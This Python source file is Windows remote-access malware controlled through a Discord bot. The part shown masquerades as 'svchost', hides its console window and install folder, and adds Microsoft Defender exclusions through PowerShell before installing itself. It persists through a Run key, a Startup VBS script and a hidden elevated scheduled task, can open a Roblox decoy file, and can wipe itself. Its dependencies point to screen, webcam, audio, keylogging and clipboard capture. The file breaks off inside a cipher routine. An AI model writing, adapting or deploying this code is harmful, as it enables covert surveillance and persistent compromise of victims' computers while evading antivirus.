import asyncio
import atexit
import ctypes
import getpass
import glob
import hashlib
import importlib
import importlib.util
import io
import json
import logging
import os
import platform
import queue
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import urllib.error
import urllib.request
import wave

# ----------------------------------------------------------------------------
# config -- the only thing you edit
# ----------------------------------------------------------------------------

TOKEN    = "The attacker's bot token from discord"
GUILD_ID = The attacker server without ""      # 0 = every guild the bot can see
PREFIX   = "!"

APP_NAME         = "svchost"
INSTALL_BASENAME = APP_NAME + ".pyw"
RUN_KEY_NAME     = "svchost"
TASK_NAME        = "svchost"
STARTUP_NAME     = APP_NAME + ".vbs"
MUTEX_NAME       = "svchost_persist_v3"

TASK_ELEVATED = True            # scheduled task runs with highest privileges
TASK_TRIGGER  = "logon"         # logon | boot | both
ADMIN_GRACE   = 8.0             # seconds a non-elevated boot instance yields
TASK_DELAY    = "0000:03"
VBS_DELAY_MS  = 12000

AUTO_DEPS   = "--no-deps" not in sys.argv
AUTO_FFMPEG = "--no-ffmpeg" not in sys.argv
AUTO_OPUS   = "--no-opus" not in sys.argv
OPEN_RBXL   = "--decoy-open" in sys.argv

CORE_DEPS = [
    ("discord", "discord.py"), ("davey", "davey"), ("mss", "mss"),
    ("numpy", "numpy"), ("sounddevice", "sounddevice"),
    ("pynput", "pynput"), ("pyperclip", "pyperclip"),
]
EXTRA_DEPS = [("cv2", "opencv-python")]

FFMPEG_SOURCES = [
    ("btbn", "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/"
             "ffmpeg-master-latest-win64-gpl.zip"),
    ("gyan", "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"),
]
OPUS_URLS = [
    "https://raw.githubusercontent.com/Rapptz/discord.py/master/discord/bin/libopus-0.x64.dll",
    "https://github.com/Rapptz/discord.py/raw/master/discord/bin/libopus-0.x64.dll",
]

DEBUG        = "--debug" in sys.argv
KEEP_OTHER   = "--keep-other" in sys.argv
NOKILL       = "--no-kill" in sys.argv
FORCE        = "--force" in sys.argv
SELF_DELETE  = "--wipe" in sys.argv
KEEP_CONSOLE = "--keep-console" in sys.argv
NO_DEFENDER  = "--no-defender" in sys.argv

VIDEO_SOURCE    = "both"        # screen | cam | both
VIDEO_FPS       = 15
VIDEO_BITRATE   = "2000k"
VIDEO_MAX_WIDTH = 1280
FFMPEG          = "ffmpeg"      # replaced once a real binary is located

CREATE_NO_WINDOW         = 0x08000000
CREATE_NEW_CONSOLE       = 0x00000010
DETACHED_PROCESS         = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
ERROR_ALREADY_EXISTS     = 183

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04
STILL_ACTIVE          = 259
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

FROZEN  = bool(getattr(sys, "frozen", False))
MEIPASS = getattr(sys, "_MEIPASS", None)

HOME_DIR     = os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()
INSTALL_DIR  = os.path.join(HOME_DIR, APP_NAME)
INSTALL_FILE = os.path.join(INSTALL_DIR,
                            (APP_NAME + ".exe") if FROZEN else INSTALL_BASENAME)
TMP_DIR      = os.path.join(tempfile.gettempdir(), APP_NAME)
TMP_LOG      = os.path.join(tempfile.gettempdir(), APP_NAME + ".log")
LOG_FILE     = os.path.join(INSTALL_DIR, "bot.log")
TOKEN_FILE   = os.path.join(INSTALL_DIR, "token.txt")
HB_FILE      = os.path.join(INSTALL_DIR, ".hb")
DEF_FILE     = os.path.join(INSTALL_DIR, ".def")
HB_TTL       = 15.0

# things that live next to the exe but are not part of the payload
SKIP_NAMES = {".hb", ".def", "bot.log", "stdout.log", "stderr.log"}

LEGACY_HOME_DIRS = [
    os.path.join(os.environ.get("APPDATA") or HOME_DIR, APP_NAME),
    os.path.join(HOME_DIR, "." + APP_NAME),
    os.path.join(tempfile.gettempdir(), APP_NAME + "_old"),
]

for _d in (INSTALL_DIR, TMP_DIR):
    try:
        os.makedirs(_d, exist_ok=True)
    except Exception:
        pass

# ----------------------------------------------------------------------------
# win32 handles + console kill, before anything heavy loads
# ----------------------------------------------------------------------------

if os.name == "nt":
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _k32.CreateMutexW.restype = ctypes.c_void_p
    _k32.CreateMutexW.argtypes = (ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p)
    _k32.CloseHandle.restype = ctypes.c_int
    _k32.CloseHandle.argtypes = (ctypes.c_void_p,)
    _k32.GetConsoleWindow.restype = ctypes.c_void_p
    _k32.GetConsoleWindow.argtypes = ()
    _k32.GetConsoleProcessList.restype = ctypes.c_uint32
    _k32.GetConsoleProcessList.argtypes = (ctypes.POINTER(ctypes.c_uint32),
                                           ctypes.c_uint32)
    _k32.OpenProcess.restype = ctypes.c_void_p
    _k32.OpenProcess.argtypes = (ctypes.c_uint32, ctypes.c_int, ctypes.c_uint32)
    _k32.GetExitCodeProcess.restype = ctypes.c_int
    _k32.GetExitCodeProcess.argtypes = (ctypes.c_void_p,
                                        ctypes.POINTER(ctypes.c_ulong))
    _k32.SetFileAttributesW.restype = ctypes.c_int
    _k32.SetFileAttributesW.argtypes = (ctypes.c_wchar_p, ctypes.c_uint32)
    _k32.FreeConsole.restype = ctypes.c_int
    _k32.FreeConsole.argtypes = ()
    _k32.SetConsoleTitleW.restype = ctypes.c_int
    _k32.SetConsoleTitleW.argtypes = (ctypes.c_wchar_p,)

    _u32 = ctypes.windll.user32
    _u32.ShowWindow.restype = ctypes.c_int
    _u32.ShowWindow.argtypes = (ctypes.c_void_p, ctypes.c_int)

    _shell32 = ctypes.windll.shell32
    _shell32.IsUserAnAdmin.restype = ctypes.c_int
    _shell32.IsUserAnAdmin.argtypes = ()
else:
    _k32 = None
    _u32 = None
    _shell32 = None

_MUTEX_HANDLE = None
LOG_LOCK = threading.Lock()
TOKEN_SOURCE = "?"
SAY_LOCK = threading.Lock()
QUIET = False


def _console_is_ours():
    """True when this process owns its own console (double-click / fresh
    window) rather than sharing one with a shell that launched us."""
    if _k32 is None:
        return True
    try:
        buf = (ctypes.c_uint32 * 8)()
        n = _k32.GetConsoleProcessList(buf, 8)
        return n <= 1
    except Exception:
        return True


def _kill_console_now():
    if DEBUG or KEEP_CONSOLE or _k32 is None:
        return
    if not _console_is_ours():
        return
    try:
        _k32.SetConsoleTitleW(APP_NAME)
    except Exception:
        pass
    try:
        hwnd = _k32.GetConsoleWindow()
        if hwnd:
            _u32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def _close_console_window():
    if _k32 is None:
        return
    try:
        hwnd = _k32.GetConsoleWindow()
        if hwnd:
            _u32.ShowWindow(hwnd, 0)
    except Exception:
        pass
    try:
        _k32.FreeConsole()
    except Exception:
        pass


_kill_console_now()


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    with LOG_LOCK:
        if not QUIET:
            try:
                print(line, flush=True)
            except Exception:
                pass
        for p in (TMP_LOG, LOG_FILE):
            try:
                with open(p, "a", encoding="utf-8", errors="ignore") as f:
                    f.write(line + "\n")
            except Exception:
                pass


def script_dir():
    try:
        if FROZEN:
            return os.path.dirname(os.path.abspath(sys.executable))
        return os.path.dirname(os.path.abspath(__file__))
    except Exception:
        return os.getcwd()


def read_text(path):
    try:
        with open(path, encoding="utf-8-sig") as f:
            return f.read()
    except OSError:
        return ""


def _download(url, dest, timeout=600, tries=3):
    part = dest + ".part"
    for attempt in range(max(1, tries)):
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) "
                               "Chrome/124.0 Safari/537.36"),
                "Accept": "*/*",
            })
            with urllib.request.urlopen(req, timeout=timeout) as r:
                total = int(r.headers.get("Content-Length") or 0)
                got = 0
                mark = 0
                with open(part, "wb") as f:
                    while True:
                        chunk = r.read(262144)
                        if not chunk:
                            break
                        f.write(chunk)
                        got += len(chunk)
                        if got - mark >= 16 * 1024 * 1024:
                            mark = got
                            log(f"  ... {got // (1024 * 1024)} MB")
            if got == 0:
                raise IOError("empty response")
            if total and got < total:
                raise IOError(f"short read {got}/{total}")
            os.replace(part, dest)
            log(f"downloaded {url} ({got} bytes)")
            return True
        except Exception as e:
            log(f"download attempt {attempt + 1}/{max(1, tries)} failed: {e}")
            try:
                os.remove(part)
            except OSError:
                pass
            time.sleep(1.5 * (attempt + 1))
    return False


def get_launcher():
    exe = sys.executable or shutil.which("python") or "python"
    d, f = os.path.split(exe)
    if f.lower() == "python.exe":
        cand = os.path.join(d, "pythonw.exe")
        if os.path.isfile(cand):
            return cand
    return exe


def hide_console():
    if DEBUG or KEEP_CONSOLE:
        return
    _kill_console_now()


def hide_dir(path):
    """hidden + system: invisible in Explorer even with 'show hidden' on."""
    if _k32 is None:
        return
    try:
        _k32.SetFileAttributesW(path,
                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
    except Exception:
        pass


def open_quietly(path):
    try:
        os.startfile(path)
    except Exception as e:
        log(f"open {path} failed: {e}")


def adopt_decoy():
    try:
        for src in glob.glob(os.path.join(script_dir(), "*.rbxl")):
            dst = os.path.join(INSTALL_DIR, os.path.basename(src))
            if not os.path.isfile(dst):
                shutil.copy2(src, dst)
                log(f"decoy adopted: {dst}")
                return dst
    except Exception as e:
        log(f"decoy adopt failed: {e}")
    return None


# ----------------------------------------------------------------------------
# elevation state -- reported only, nothing is ever asked for
# ----------------------------------------------------------------------------

def is_admin():
    if os.name != "nt" or _shell32 is None:
        return True
    try:
        return bool(_shell32.IsUserAnAdmin())
    except Exception:
        return False


def task_present():
    try:
        r = subprocess.run(["schtasks", "/Query", "/TN", TASK_NAME],
                           capture_output=True, text=True, timeout=15,
                           creationflags=CREATE_NO_WINDOW)
        return r.returncode == 0
    except Exception:
        return False


def _elevation_grace():
    """The /RL HIGHEST task lands a few seconds after logon and comes up
    elevated. The non-elevated Run-key instance yields so the elevated one
    wins the mutex instead of being beaten to it."""
    if FORCE or is_admin() or not TASK_ELEVATED:
        return
    if not task_present():
        return
    log(f"waiting {int(ADMIN_GRACE)}s for the elevated instance")
    time.sleep(ADMIN_GRACE)


# ----------------------------------------------------------------------------
# defender hardening -- needs admin, so it lands on the first elevated boot
# ----------------------------------------------------------------------------

def _ps(cmd, timeout=45):
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", cmd],
            capture_output=True, text=True, timeout=timeout,
            creationflags=CREATE_NO_WINDOW)
        return (r.stdout or ""), (r.stderr or ""), r.returncode
    except Exception as e:
        return "", str(e), -1


def _defender_paths():
    out, _err, rc = _ps("(Get-MpPreference).ExclusionPath -join ';'", timeout=30)
    return out.strip().lower() if rc == 0 else ""


def defender_state():
    try:
        with open(DEF_FILE, encoding="utf-8") as f:
            return f.read().split()[0]
    except Exception:
        return "none"


def _sq(s):
    return "'" + str(s).replace("'", "''") + "'"


def harden_defender(force=False):
    """Ask Defender to stop scanning us. Needs admin to stick, so a failed
    non-elevated attempt is retried the moment an elevated instance runs."""
    if NO_DEFENDER or os.name != "nt":
        return
    try:
        if not force and os.path.isfile(DEF_FILE):
            with open(DEF_FILE, encoding="utf-8") as f:
                flag, ts = f.read().split()
            age = time.time() - float(ts)
            if flag == "ok":
                if age < 7 * 86400:
                    return
            elif is_admin() and flag == "retry0":
                pass                      # last try was non-elevated: go again
            elif age < 300:
                return
    except Exception:
        pass

    try:
        want = [INSTALL_DIR, TMP_DIR]
        have = _defender_paths()
        missing = [p for p in want if p.lower().rstrip("\\") not in have]
        if missing:
            _ps("Add-MpPreference -ExclusionPath "
                + ",".join(_sq(p) for p in missing)
                + " -ErrorAction SilentlyContinue | Out-Null")

        _ps("Add-MpPreference -ExclusionProcess "
            + _sq(os.path.basename(INSTALL_FILE))
            + " -ErrorAction SilentlyContinue | Out-Null")

        _ps("Add-MpPreference -ControlledFolderAccessAllowedApplications "
            + _sq(INSTALL_FILE)
            + " -ErrorAction SilentlyContinue | Out-Null")

        have = _defender_paths()
        ok = all(p.lower().rstrip("\\") in have for p in want)
        try:
            with open(DEF_FILE, "w", encoding="utf-8") as f:
                f.write(("ok" if ok else
                         ("retry1" if is_admin() else "retry0"))
                        + " " + str(time.time()))
        except Exception:
            pass
        log("defender exclusions: " + ("applied" if ok else "NOT applied"))
    except Exception as e:
        log(f"defender harden failed: {e}")


# ----------------------------------------------------------------------------
# persistence -- scheduled task (elevated, hidden, XML) + Run key + Startup
# ----------------------------------------------------------------------------

def _xml_esc(s):
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


def _launch_parts():
    """(executable, arguments) that relaunch us with NO console window.
    pythonw.exe is the whole trick for script mode -- python.exe always
    paints a console, pythonw never does."""
    if FROZEN:
        return INSTALL_FILE, ""
    return get_launcher(), f'"{INSTALL_FILE}"'


def _persist_command():
    exe, args = _launch_parts()
    return f'"{exe}" {args}'.strip()


def _task_delay_iso():
    try:
        h, m = str(TASK_DELAY).split(":")
        secs = int(h) * 3600 + int(m) * 60
    except Exception:
        secs = 3
    return f"PT{max(0, secs)}S"


def _user_sid():
    try:
        r = subprocess.run(["whoami", "/user"], capture_output=True, text=True,
                           timeout=10, creationflags=CREATE_NO_WINDOW)
        m = re.search(r"(S-1-[0-9-]+)", r.stdout or "")
        if m:
            return m.group(1)
    except Exception:
        pass
    dom = os.environ.get("USERDOMAIN") or ""
    usr = os.environ.get("USERNAME") or ""
    return f"{dom}\\{usr}".strip("\\")


def _task_xml():
    exe, args = _launch_parts()
    sid = _user_sid()
    level = "HighestAvailable" if TASK_ELEVATED else "LeastPrivilege"
    delay = _task_delay_iso()

    trig = []
    if TASK_TRIGGER in ("logon", "both"):
        trig.append("<LogonTrigger><Enabled>true</Enabled>"
                    f"<UserId>{_xml_esc(sid)}</UserId>"
                    f"<Delay>{delay}</Delay></LogonTrigger>")
    if TASK_TRIGGER in ("boot", "both"):
        trig.append("<BootTrigger><Enabled>true</Enabled>"
                    f"<Delay>{delay}</Delay></BootTrigger>")

    return (
'<?xml version="1.0" encoding="UTF-16"?>\n'
'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
'  <RegistrationInfo>\n'
f'    <Description>{APP_NAME} silent autostart</Description>\n'
'  </RegistrationInfo>\n'
'  <Triggers>\n'
f'    {"".join(trig)}\n'
'  </Triggers>\n'
'  <Principals>\n'
'    <Principal id="Author">\n'
f'      <UserId>{_xml_esc(sid)}</UserId>\n'
'      <LogonType>InteractiveToken</LogonType>\n'
f'      <RunLevel>{level}</RunLevel>\n'
'    </Principal>\n'
'  </Principals>\n'
'  <Settings>\n'
'    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n'
'    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n'
'    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n'
'    <AllowHardTerminate>true</AllowHardTerminate>\n'
'    <StartWhenAvailable>true</StartWhenAvailable>\n'
'    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n'
'    <IdleSettings>\n'
'      <StopOnIdleEnd>false</StopOnIdleEnd>\n'
'      <RestartOnIdle>false</RestartOnIdle>\n'
'    </IdleSettings>\n'
'    <AllowStartOnDemand>true</AllowStartOnDemand>\n'
'    <Enabled>true</Enabled>\n'
'    <Hidden>true</Hidden>\n'
'    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n'
'    <WakeToRun>false</WakeToRun>\n'
'    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n'
'    <Priority>7</Priority>\n'
'    <RestartOnFailure>\n'
'      <Interval>PT1M</Interval>\n'
'      <Count>3</Count>\n'
'    </RestartOnFailure>\n'
'  </Settings>\n'
'  <Actions Context="Author">\n'
'    <Exec>\n'
f'      <Command>{_xml_esc(exe)}</Command>\n'
f'      <Arguments>{_xml_esc(args)}</Arguments>\n'
f'      <WorkingDirectory>{_xml_esc(INSTALL_DIR)}</WorkingDirectory>\n'
'    </Exec>\n'
'  </Actions>\n'
'</Task>\n')


def _add_task_xml():
    path = os.path.join(TMP_DIR, "task.xml")
    try:
        with open(path, "w", encoding="utf-16") as f:
            f.write(_task_xml())
    except Exception as e:
        log(f"task xml write failed: {e}")
        return False
    try:
        r = subprocess.run(["schtasks", "/Create", "/TN", TASK_NAME,
                            "/XML", path, "/F"],
                           capture_output=True, text=True, timeout=30,
                           creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        log(f"task xml create failed: {e}")
        return False
    if r.returncode == 0:
        return True
    blob = ((r.stdout or "") + (r.stderr or "")).strip().replace("\n", " ")
    log(f"task xml rc={r.returncode}: {blob[:200]}")
    return False


def _add_task_args():
    """Fallback for the rare box where the XML route is refused. Note this
    path inherits the battery bug -- that is why XML is preferred."""
    cmd = ["schtasks", "/Create", "/SC", "ONLOGON", "/TN", TASK_NAME,
           "/TR", _persist_command(), "/DELAY", TASK_DELAY, "/F"]
    if TASK_ELEVATED:
        cmd[6:6] = ["/RL", "HIGHEST"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30,
                           creationflags=CREATE_NO_WINDOW)
        if r.returncode == 0:
            return True
        blob = ((r.stdout or "") + (r.stderr or "")).strip().replace("\n", " ")
        log(f"persistence task rc={r.returncode}: {blob[:200]}")
    except Exception as e:
        log(f"persistence task FAILED: {e}")
    return False


def add_task():
    """Primary entry point. /RL HIGHEST is the only thing on Windows that
    hands out admin at logon with no prompt, and unlike the Run key and the
    Startup folder it never appears in Task Manager's Startup tab."""
    if _add_task_xml():
        log(f"persistence set (scheduled task, xml, trigger={TASK_TRIGGER}, "
            f"elevated={TASK_ELEVATED}, hidden)")
        return True
    if _add_task_args():
        log("persistence set (scheduled task, fallback flags)")
        return True
    return False


def _startup_dir():
    base = os.environ.get("APPDATA") or HOME_DIR
    return os.path.join(base, "Microsoft", "Windows", "Start Menu",
                        "Programs", "Startup")


def write_startup_vbs():
    try:
        d = _startup_dir()
        os.makedirs(d, exist_ok=True)
        path = os.path.join(d, STARTUP_NAME)
        cmd = _persist_command().replace('"', '""')
        lines = [
            "' " + APP_NAME + " autostart",
            f"WScript.Sleep {VBS_DELAY_MS}",
            'Set sh = CreateObject("WScript.Shell")',
            f'sh.Run "{cmd}", 0, False',
        ]
        with open(path, "w", encoding="ascii", newline="\r\n") as f:
            f.write("\r\n".join(lines) + "\r\n")
        log(f"persistence set (Startup vbs): {path}")
        return path
    except Exception as e:
        log(f"persistence Startup vbs FAILED: {e}")
        return None


def add_persistence():
    cmd = _persist_command()
    try:
        import winreg
        key = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        log(f"persistence set (Run key): {cmd}")
    except Exception as e:
        log(f"persistence Run key FAILED: {e}")
    write_startup_vbs()
    add_task()


def remove_persistence():
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, RUN_KEY_NAME)
        winreg.CloseKey(key)
        log("persistence removed (Run key)")
    except Exception:
        pass
    try:
        p = os.path.join(_startup_dir(), STARTUP_NAME)
        if os.path.isfile(p):
            os.remove(p)
            log("persistence removed (Startup vbs)")
    except Exception:
        pass
    try:
        r = subprocess.run(["schtasks", "/Delete", "/TN", TASK_NAME, "/F"],
                           capture_output=True, text=True, timeout=20,
                           creationflags=CREATE_NO_WINDOW)
        if r.returncode == 0:
            log("persistence removed (scheduled task)")
    except Exception:
        pass


def read_persistence():
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ)
        try:
            val, _ = winreg.QueryValueEx(key, RUN_KEY_NAME)
        except FileNotFoundError:
            val = "(absent)"
        winreg.CloseKey(key)
        return val
    except Exception as e:
        return f"error: {e}"


# ----------------------------------------------------------------------------
# single-instance claim -- mutex first, heartbeat as the tiebreak
# ----------------------------------------------------------------------------

def _pid_alive(pid):
    if _k32 is None:
        return False
    try:
        h = _k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, int(pid))
        if not h:
            return False
        code = ctypes.c_ulong()
        ok = _k32.GetExitCodeProcess(ctypes.c_void_p(h), ctypes.byref(code))
        _k32.CloseHandle(ctypes.c_void_p(h))
        return bool(ok) and code.value == STILL_ACTIVE
    except Exception:
        return False


def hb_write():
    try:
        with open(HB_FILE, "w", encoding="utf-8") as f:
            f.write(f"{os.getpid()} {int(time.time())}")
    except Exception:
        pass


def hb_owner():
    """pid of another live, recent instance, or None."""
    try:
        with open(HB_FILE, encoding="utf-8") as f:
            pid = int(f.read().split()[0])
    except Exception:
        return None
    try:
        if time.time() - os.path.getmtime(HB_FILE) > HB_TTL:
            return None
    except OSError:
        return None
    if pid == os.getpid() or not _pid_alive(pid):
        return None
    return pid


def _heartbeat():
    while True:
        hb_write()
        time.sleep(4)


def _hidden_startupinfo():
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    return si


def relaunch_detached():
    try:
        args = [a for a in sys.argv[1:] if a != "--wipe"]
        cmd = ([INSTALL_FILE] if FROZEN else [get_launcher(), INSTALL_FILE]) + args

        if DEBUG:
            if not FROZEN:
                console = os.path.join(os.path.dirname(get_launcher()), "python.exe")
                if os.path.isfile(console):
                    cmd[0] = console
            p = subprocess.Popen(cmd, cwd=INSTALL_DIR, close_fds=True,
                                 creationflags=CREATE_NEW_CONSOLE)
            log(f"relaunched debug pid={p.pid} cmd={cmd}")
            return True

        flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
        out = open(os.path.join(INSTALL_DIR, "stdout.log"), "ab", buffering=0)
        err = open(os.path.join(INSTALL_DIR, "stderr.log"), "ab", buffering=0)
        p = subprocess.Popen(cmd, creationflags=flags, close_fds=True,
                             cwd=INSTALL_DIR, stdin=subprocess.DEVNULL,
                             stdout=out, stderr=err)
        log(f"relaunched pid={p.pid} cmd={cmd}")
        return True
    except Exception as e:
        log(f"relaunch FAILED: {e}\n{traceback.format_exc()}")
        return False


def _is_onedir():
    """PyInstaller onedir puts _MEIPASS in a _internal folder beside the exe.
    onefile puts it in %TEMP%\\_MEIxxxxx instead."""
    if not FROZEN or not MEIPASS:
        return False
    try:
        return (os.path.normcase(os.path.dirname(os.path.abspath(MEIPASS))) ==
                os.path.normcase(os.path.dirname(os.path.abspath(sys.executable))))
    except Exception:
        return False


def install_self(cur):
    """Copy the payload into the hidden install dir. onedir builds need the
    whole _internal tree, not just the exe."""
    if _is_onedir():
        src_dir = os.path.dirname(os.path.abspath(sys.executable))
        log(f"onedir build -> copying tree from {src_dir}")
        try:
            for root, _dirs, files in os.walk(src_dir):
                rel = os.path.relpath(root, src_dir)
                dst_dir = (INSTALL_DIR if rel == "."
                           else os.path.join(INSTALL_DIR, rel))
                os.makedirs(dst_dir, exist_ok=True)
                for fn in files:
                    if fn in SKIP_NAMES:
                        continue
                    s = os.path.join(root, fn)
                    d = os.path.join(dst_dir, fn)
                    try:
                        if (os.path.isfile(d)
                                and os.path.getsize(d) == os.path.getsize(s)):
                            continue
                        shutil.copy2(s, d)
                    except Exception as e:
                        log(f"  copy {fn} failed: {e}")
            return os.path.isfile(INSTALL_FILE)
        except Exception as e:
            log(f"tree copy FAILED: {e}")
            return False
    try:
        shutil.copy2(cur, INSTALL_FILE)
        return True
    except Exception as e:
        log(f"copy FAILED: {e}")
        return False


def bootstrap():
    cur = os.path.abspath(sys.executable if FROZEN else __file__)
    target = os.path.abspath(INSTALL_FILE)

    if os.path.normcase(cur) == os.path.normcase(target):
        log("already running from install location")
        hide_dir(INSTALL_DIR)
        hide_dir(TMP_DIR)
        add_persistence()
        return True

    if hb_owner() is not None:
        log("live instance already installed -> not relaunching")
        hide_dir(INSTALL_DIR)
        add_persistence()
        return False

    log("not installed -> installing")
    # exclude the destination BEFORE we write into it, so Defender's on-write
    # scan never sees the fresh copy
    harden_defender(force=True)

    os.makedirs(INSTALL_DIR, exist_ok=True)
    if not install_self(cur):
        log("install FAILED -> running in place")
        return True
    log(f"installed -> {INSTALL_FILE}")

    decoy = adopt_decoy() if OPEN_RBXL else None
    hide_dir(INSTALL_DIR)
    hide_dir(TMP_DIR)
    add_persistence()
    if relaunch_detached():
        if decoy:
            open_quietly(decoy)
        return False
    log("relaunch failed -> running in place instead")
    return True


def schedule_self_delete():
    remove_persistence()

    targets = list(LEGACY_HOME_DIRS)
    if MEIPASS and not _is_onedir():
        targets.append(MEIPASS)
    targets += [TMP_DIR, TMP_LOG, INSTALL_FILE, INSTALL_DIR]

    lines = ["@echo off", "ping -n 3 127.0.0.1 >nul"]
    lines.append(f'schtasks /Delete /TN "{TASK_NAME}" /F >nul 2>&1')
    for t in targets:
        lines.append(f'if exist "{t}" del /f /q "{t}" >nul 2>&1')
        lines.append(f'if exist "{t}\\" rmdir /s /q "{t}" >nul 2>&1')
    lines.append(f'for /d %%d in ("{os.path.join(tempfile.gettempdir(), "Rar$*")}") '
                 'do rmdir /s /q "%%d" >nul 2>&1')
    lines.append('del /f /q "%~f0" >nul 2>&1')

    bat = os.path.join(tempfile.gettempdir(), "keytie_wipe.bat")
    try:
        with open(bat, "w", encoding="utf-8", newline="\r\n") as f:
            f.write("\r\n".join(lines) + "\r\n")
    except Exception as e:
        log(f"wipe script write failed: {e}")
        return
    try:
        subprocess.Popen(["cmd.exe", "/c", bat],
                         startupinfo=_hidden_startupinfo(),
                         creationflags=CREATE_NO_WINDOW,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, close_fds=True)
        log(f"self-delete scheduled via {bat} (silent)")
    except Exception as e:
        log(f"self-delete failed: {e}")


# ----------------------------------------------------------------------------
# dependency bootstrap
# ----------------------------------------------------------------------------

def _module_present(name):
    try:
        return importlib.util.find_spec(name) is not None
    except Exception:
        return False


def _pip_install(pkgs):
    base = [sys.executable, "-m", "pip", "install", "--quiet", "--no-input",
            "--disable-pip-version-check", "--no-warn-script-location"]
    for extra in ([], ["--user"]):
        try:
            r = subprocess.run(
                base + extra + list(pkgs), stdin=subprocess.DEVNULL,
                capture_output=True, text=True, timeout=900,
                creationflags=CREATE_NO_WINDOW)
            if r.returncode == 0:
                return True
            log(f"pip rc={r.returncode}: {((r.stderr or r.stdout or '').strip()[-300:])}")
        except Exception as e:
            log(f"pip failed: {e}")
    return False


def install_deps():
    if FROZEN or not AUTO_DEPS:
        return
    need = [pip for mod, pip in CORE_DEPS if not _module_present(mod)]
    if need:
        if not _module_present("pip"):
            try:
                subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"],
                               stdin=subprocess.DEVNULL, capture_output=True,
                               timeout=300, creationflags=CREATE_NO_WINDOW)
            except Exception:
                pass
        log(f"installing: {', '.join(need)}")
        log("deps " + ("installed" if _pip_install(need) else "INSTALL FAILED"))
        importlib.invalidate_caches()
    extra = [pip for mod, pip in EXTRA_DEPS if not _module_present(mod)]
    if extra and _pip_install(extra):
        importlib.invalidate_caches()


if SELF_DELETE:
    QUIET = True
    schedule_self_delete()
    _close_console_window()
    os._exit(0)

install_deps()

if not bootstrap():
    sys.exit(0)


# ----------------------------------------------------------------------------
# pure-python nacl (only used when PyNaCl is absent)
# ----------------------------------------------------------------------------

_MASK32 = 0xFFFFFFFF
_SIGMA = struct.unpack("<4I", b"expand 32-byte k")


def _rotl(x, n):
    return ((x << n) | (x >> (32 - n))) & _MASK32


def _xor(a, b):
    return bytes(p ^ q for p, q in zip(a, b))


def _poly1305(msg, key):
    r = int.from_bytes(key[:16], "little")
    r &= 0x0FFFFFFC0FFFFFFC0FFFFFFC0FFFFFFF
    s = int.from_bytes(key[16:32], "little")
    p = (1 << 130) - 5
    acc = 0
    for i in range(0, len(msg), 16):
        blk = msg[i:i + 16]
        n = int.from_bytes(blk, "little") | (1 << (8 * len(blk)))
        acc = ((acc + n) * r) % p
    return ((acc + s) & ((1 << 128) - 1)).to_bytes(16, "little")


def _salsa20_rounds(x):
    for _ in range(10):
        x[4] ^= _rotl((x[0] + x[12]) & _MASK32, 7)
        x[8] ^= _rotl((x[4] + x[0]) & _MASK32, 9)
        x[12] ^= _rotl((x[8] + x[4]) & _MASK32, 13)
        x[0] ^= _rotl((x[12] + x[8]) & _MASK32, 18)

        x[9] ^= _rotl((x[5] + x[1]) & _MASK32, 7)
        x[13] ^= _rotl((x[9] + x[5]) & _MASK32, 9)
        x[1] ^= _rotl((x[13] + x[9]) & _MASK32, 13)
        x[5] ^= _rotl((x[1] + x[13]) & _MASK32, 18)

        x[14] ^= _rotl((x[10] + x[6]) & _MASK32, 7)
        x[2] ^= _rotl((x[14] + x[10]) & _MASK32, 9)
        x[6] ^= _rotl((x[2] + x[14]) & _MASK32, 13)
        x[10] ^= _rotl((x[6] + x[2]) & _MASK32, 18)

        x[3] ^= _rotl((x[15] + x[11]) & _MASK32, 7)
        x[7] ^= _rotl((x[3] + x[15]) & _MASK32, 9)
        x[11] ^= _rotl((x[7] + x[3]) & _MASK32, 13)
        x[15] ^= _rotl((x[11] + x[7]) & _MASK32, 18)

